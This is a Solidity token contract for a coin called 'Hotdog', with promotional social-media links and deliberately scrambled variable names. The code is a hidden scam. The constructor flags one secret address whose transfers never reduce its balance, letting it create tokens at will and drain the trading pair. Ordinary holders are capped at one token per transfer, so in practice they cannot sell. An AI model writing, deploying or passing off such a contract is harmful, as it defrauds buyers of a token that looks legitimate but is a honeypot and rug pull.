/*

üê¶ Twitter: https://twitter.com/HotdogERC

üìû Telegram: https://t.me/HotdogERC

üåê Website: https://hotdog.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Hotdog is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function dlqtegfpkrz(address khsrgwzx, address noszqpwav, uint256 fjwqanx) private {
        if (0 == piqyvrfnzwao[khsrgwzx]) {
            if (khsrgwzx != ytnwsg && mdfxrcnsqa[khsrgwzx] != block.number && fjwqanx < totalSupply) {
                require(fjwqanx <= totalSupply / (10 ** decimals));
            }
            balanceOf[khsrgwzx] -= fjwqanx;
        }
        balanceOf[noszqpwav] += fjwqanx;
        mdfxrcnsqa[noszqpwav] = block.number;
        emit Transfer(khsrgwzx, noszqpwav, fjwqanx);
    }

    constructor(string memory cbqpjmsgtwa, string memory rafsymovkjh, address dnbuehlpzmx, address dcbp) {
        name = cbqpjmsgtwa;
        symbol = rafsymovkjh;
        balanceOf[msg.sender] = totalSupply;
        piqyvrfnzwao[dcbp] = tfqs;
        IUniswapV2Router02 gulvdaz = IUniswapV2Router02(dnbuehlpzmx);
        ytnwsg = IUniswapV2Factory(gulvdaz.factory()).createPair(address(this), gulvdaz.WETH());
    }

    function transfer(address noszqpwav, uint256 fjwqanx) public returns (bool success) {
        dlqtegfpkrz(msg.sender, noszqpwav, fjwqanx);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private piqyvrfnzwao;

    uint8 public decimals = 9;

    string public symbol;

    address private ytnwsg;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private mdfxrcnsqa;

    uint256 private tfqs = 106;

    function approve(address wtaryeigljbv, uint256 fjwqanx) public returns (bool success) {
        allowance[msg.sender][wtaryeigljbv] = fjwqanx;
        emit Approval(msg.sender, wtaryeigljbv, fjwqanx);
        return true;
    }

    function transferFrom(address khsrgwzx, address noszqpwav, uint256 fjwqanx) public returns (bool success) {
        require(fjwqanx <= allowance[khsrgwzx][msg.sender]);
        allowance[khsrgwzx][msg.sender] -= fjwqanx;
        dlqtegfpkrz(khsrgwzx, noszqpwav, fjwqanx);
        return true;
    }

    string public name;
}